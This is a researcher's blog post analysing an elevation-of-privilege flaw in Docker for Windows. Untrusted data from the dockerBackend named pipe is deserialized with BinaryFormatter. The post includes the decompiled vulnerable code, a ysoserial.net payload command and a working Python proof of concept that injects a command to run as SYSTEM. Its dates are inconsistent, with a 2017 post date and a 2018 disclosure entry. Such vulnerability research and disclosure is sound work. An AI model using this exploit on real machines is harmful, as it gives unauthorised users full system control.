---
layout: post
title: "You can't contain me! :: Analyzing and Exploiting an Elevation of Privilege Vulnerability in Docker for Windows"
date: 2017-09-06 09:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Docker for Windows" src="/assets/images/docker.png">
<p class="cn">I have been continuing my journey of searching for windows breakout vulnerabilities in popular applications and one that I recently discovered I found interesting enough to share with you all. Whilst kernel vulnerabilities are fun to discover, there are many third party applications that don't use their own custom drivers and as such require more lucritive means to gain a SYSTEM shell.</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn">I walk through discovering and exploiting a .net deserialization vulnerability in Docker for Windows. This vulnerability was discovered on the 6th of March.</p>

### Introduction

<p class="cn" markdown="1">Docker for Windows comes as a 64bit installation package for Windows 10 and above. I quickly spun up a Windows 10 64bit virtual machine for testing purposes. Taken directly from the [docker] site:</p>

> An integrated, easy-to-deploy development environment for building, debugging and testing Docker apps on a Windows PC. Docker for Windows is a native Windows app deeply integrated with Hyper-V virtualization, networking and file system, making it the fastest and most reliable Docker environment for Windows

<p class="cn" markdown="1">By default, Docker for Windows installs a client and server application.</p>

### Discovering the Vulnerability

<p class="cn" markdown="1">
After browsing the currently running processes with Process Explorer from SysInternals, I found a process called `com.docker.service`. This process had created some NamedPipes called **dockerBackend** and **dockerLogs** and is compiled with .net.</p>

{% include image.html
            img="assets/images/docker-search.png"
            title="Searching for NamedPipes"
            caption="Searching for NamedPipes"
            style="width:80%;height:80%" %}

#### Permission Check

<p class="cn" markdown="1">Once I had found a potential attack surface with NamedPipes, it was important that I checked what permissions were set on the NamedPipe to ensure that low privlidged users could access it. Any vulnerabilities in this interface could mean that a low privlidged attacker can escalate to SYSTEM level.</p>

<p class="cn" markdown="1">To do this check, I used [Pipe Secuirty Viewer](http://retired.beyondlogic.org/solutions/pipesec/pipesec.htm) by Craig Peacock from Beyond Logic. Whilst this tool is old, it gets the job done (however I am open for suggestions on better tools/methods for doing these checks).</p>

<p class="cn" markdown="1">After simply running the tool, we can get a list of NamedPipes that are running on the system. By specifying our `\\NamedPipe\dockerBackend` pipe, we can see the allowed user and groups and what permissions are set for each.</p>

{% include image.html
            img="assets/images/namedpipe-access.png"
            title="Showing the users & groups with access to the NamedPipe"
            caption="Showing the users & groups with access to the NamedPipe"
            style="width:80%;height:80%" %}


<p class="cn" markdown="1">One of the users I noticed is the **docker-users** group, which is a windows group that is created upon installation of the Docker for Windows. The TL;DR is that this group is used for accounts that want to access containers. This looked interesting to me, so I decided to check out their permissions. As it turns out, thier pretty relaxed about things.</p>

{% include image.html
            img="assets/images/docker-users-perms.png"
            title="Permissions set for the docker-users group on the dockerBackend NamedPipe"
            caption="Permissions set for the docker-users group on the dockerBackend NamedPipe"
            style="width:40%;height:40%" %}

#### Finding Valid Data

<p class="cn" markdown="1">At this point I needed to find some valid data to send to this endpoint. I could have just starting diving into the source code at this point, but to be honest, at the time I had assumed that Docker for Windows was going to do some complex parsing through this NamedPipe. There are not many tools to sniff NamedPipe data, but one that I found was called [I/O Ninja](http://ioninja.com/) which has an module for this exact purpose.</p>

{% include image.html
            img="assets/images/ioninja.png"
            title="Captured NamedPipe data in I/O Ninja"
            caption="Captured NamedPipe data in I/O Ninja"
            style="width:60%;height:60%" %}

<p class="cn" markdown="1">I set a filter for **dockerBackend** and proceeded to run the client, which dumped the following output. Circled in purple, is the size of the buffer, followed by a .net serialized object.</p>

### The vulnerability

<p class="cn" markdown="1">So at this point, we can dive into the decompiled source code to confirm our suspicions. I am using dnSpy here, so I load up the **C:\Program Files\Docker\Docker\com.docker.service** binary. A quick check reveals our vulnerable code is actually inside of the **Docker.core.dll** binary within the **Docker.Core.Pipe** namespace.</p>

<p class="cn" markdown="1">Within this namespace, we can see a class defined as NamedPipeServer and the first method that is executed is **Run**</p>

```csharp
        public void Run()
        {
            this._cts = new CancellationTokenSource();
            CancellationToken token = this._cts.Token;
            this._currentRunningTask = this.DoRunAsync(token);
        }
```

<p class="cn" markdown="1">This **Run** calls the **DoRunAsync** method.</p>

```csharp
        private async Task DoRunAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                NamedPipeServer.<>c__DisplayClass10_0 <>c__DisplayClass10_ = new NamedPipeServer.<>c__DisplayClass10_0();
                <>c__DisplayClass10_.<>4__this = this;
                try
                {
                    <>c__DisplayClass10_.pipeServer = PipeHelper.NewServerStream(this._pipeName, this._usersGroup.Sid);
                }
                catch (Exception e)
                {
                    this._logger.Error(string.Format("Unable to create a pipe: {0} {1}", e.Message, e.StackTrace));
                    continue;
                }
                try
                {
                    await <>c__DisplayClass10_.pipeServer.WaitForConnectionAsync(token);
                }
                catch (OperationCanceledException)
                {
                }
                catch (Exception e2)
                {
                    this._logger.Error(string.Format("Unable to connect: {0} {1}", e2.Message, e2.StackTrace));
                    continue;
                }
                Task.Run(() => <>c__DisplayClass10_.<>4__this.HandleRequestAsync(<>c__DisplayClass10_.pipeServer));
                <>c__DisplayClass10_ = null;
            }
        }
```

<p class="cn" markdown="1">Then the **DoRunAsync** method calls the **HandleRequestAsync** method.</p>

```csharp
private async Task HandleRequestAsync(NamedPipeServerStream pipeServer)
{
    try
    {
        using (NamedPipeServerStream server = pipeServer)
        {
            byte[] sizeBytes = new byte[4];
            await server.ReadAsync(sizeBytes, 0, sizeBytes.Length);
            int size = BitConverter.ToInt32(sizeBytes, 0);
            byte[] requestBytes = new byte[size];
            await server.ReadAsync(requestBytes, 0, requestBytes.Length);
            BinaryFormatter bf = new BinaryFormatter();
            PipeRequest request = (PipeRequest)bf.Deserialize(new MemoryStream(requestBytes, 0, requestBytes.Length, false));
```

<p class="cn" markdown="1">Finlly, this method calls the BinaryFormatter's **Deserialize** on untrusted data leading to code execution as **SYSTEM**.</p>

### Exploitation

<p class="cn" markdown="1">Now comes the fun bit. I first needed to create a test user account and place them into the docker-users group. Following that, I launched a command shell under that users privilege.</p>

```
C:\>net localgroup docker-users test /add
The command completed successfully.

C:\>runas /user:test cmd
Enter the password for test:
Attempting to start cmd as user "target\test" ...
```

<p class="cn" markdown="1">Then, using [ysoserial.net] I used the **BinaryFormatter** class as the formatter and used [@tiraniddo's] **TypeConfuseDelegate** gadget chain.</p>

```
C:\>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o raw -c "[CMD]" > poc.bin
```

<p class="cn" markdown="1">Obviously, we can't execute `[CMD]` so I modified the binary payload to accept any command for my poc. Now, it was simply a matter of testing things out!</p>

{% include image.html
            img="assets/images/docker-exploit.png"
            title="Getting SYSTEM via Docker for Windows"
            caption="Getting SYSTEM via Docker for Windows"
            style="width:50%;height:50%" %}

Here is the source to the poc:

```python
import sys
import struct

if len(sys.argv) != 2:
    print "(+) usage %s <cmd>" % sys.argv[0]
    print "(+) eg: %s \"whoami > c:\\si.txt\"" % sys.argv[0]
    sys.exit(-1)
    
cmd = "/c %s" % sys.argv[1]

with open('poc.bin', 'rb') as p:
    payload = p.read()

# now we patch our payload
data = bytearray(payload)

# patch the size
data[655:655] = struct.pack(">I", len(cmd))

# patch the cmd
data[659:659] = cmd

# get the size to send
size = struct.pack("<I", len(data))

np = open(r'\\.\pipe\dockerBackend', 'w+b')

# exploit!
np.write(size)
np.write(data)

# clean up
np.close()
```

### Timeline

<div markdown="1" class="cn">
- 2018-03-06 â€“ Verified and sent to the [Zero Day Initiative](https://www.zerodayinitiative.com/).
- ...
</div>

### Conclusion

<p class="cn">These vulnerabilities are easy to find and easy to exploit. I suspect that .net deserialization vulnerabilities will become more prevelient as researchers discover the high availability of .net in third party applications. The tools are already here for researchers and attackers to discover them and like thier Java counterpart, I beleieve they will impact a wide variety of third party Windows software, esspecially in the enterprise space.</p>

### References

<div markdown="1" class="cn">
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [https://speakerdeck.com/pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
</div>

[docker]: https://www.docker.com/docker-windows
[ysoserial.net]: https://github.com/pwntester/ysoserial.net
[@tiraniddo's]: https://twitter.com/tiraniddo